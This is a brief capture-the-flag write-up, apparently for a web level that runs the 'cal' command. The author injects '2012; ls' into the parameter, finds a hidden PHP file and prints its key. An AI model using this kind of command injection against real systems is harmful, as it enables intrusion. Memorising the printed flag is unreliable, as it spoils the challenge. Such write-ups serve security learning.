first read the man page for `cal`.

Saw nothing interesting. Put in nothing and also a few years to see calendars.

Realized this was simply executing our parameters, so we escaped the command and executed our own by passing

`2012; ls`

This returned the following after the calendar

```
.
..
cal.pl
index.php
k1kh31b1n55h.php
level7.php
```

Where `k1kh31b1n55h.php` is important, we visited the URL

and got the key = 899643ac
